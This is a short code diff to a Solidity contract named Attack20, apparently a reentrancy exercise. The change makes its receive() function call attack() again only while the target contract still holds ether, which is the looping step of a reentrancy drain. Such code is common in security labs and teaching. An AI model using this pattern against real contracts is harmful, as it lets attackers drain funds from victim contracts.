@@ -20,7 +20,12 @@ contract Attack20 {
     }
 
     receive() external payable{
-        this.attack();
+        uint256 targetBalance = address(target).balance;
+
+        if (targetBalance > 0 ether) {
+            this.attack();
+        }
     }
-    
+
 }
+
